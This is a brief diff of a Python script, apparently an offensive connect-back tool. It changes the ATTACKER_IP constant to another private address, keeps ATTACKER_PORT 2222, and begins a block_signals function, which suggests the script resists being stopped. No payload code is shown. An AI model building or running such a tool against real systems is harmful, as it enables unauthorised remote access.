@@ -5,7 +5,7 @@ import time
 import signal
 
 # Attacker's IP & Port (CHANGE THESE)
-ATTACKER_IP = "192.168.137.182"
+ATTACKER_IP = "172.17.0.3"
 ATTACKER_PORT = 2222
 
 def block_signals():
